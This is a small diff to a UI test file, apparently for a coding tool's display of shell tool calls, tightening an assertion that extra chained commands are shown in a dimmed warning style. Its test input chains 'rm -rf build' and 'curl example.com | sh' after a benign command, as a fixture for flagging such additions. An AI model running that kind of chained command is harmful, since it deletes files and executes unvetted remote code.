@@ -175,7 +175,7 @@ test('an Orbit call that runs other commands names them on its row', async ($, o
   on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
   const ui = await $.ui.mount(toolUse('glab orbit status; rm -rf build; curl example.com | sh'))
   expect(await ui.find({ type: 'Text', text: 'Checked Orbit' })).toBeDefined()
-  expect((await ui.find({ type: 'Text', text: '  + rm, curl, sh' }))?.props.color).toBe('warning')
+  expect((await ui.find({ type: 'Text', text: '  + rm, curl, sh' }))?.props).toMatchObject({ color: 'warning', dimColor: true })
 })
 
 test('an Orbit-only call has no other commands on its row', async ($, on) => {
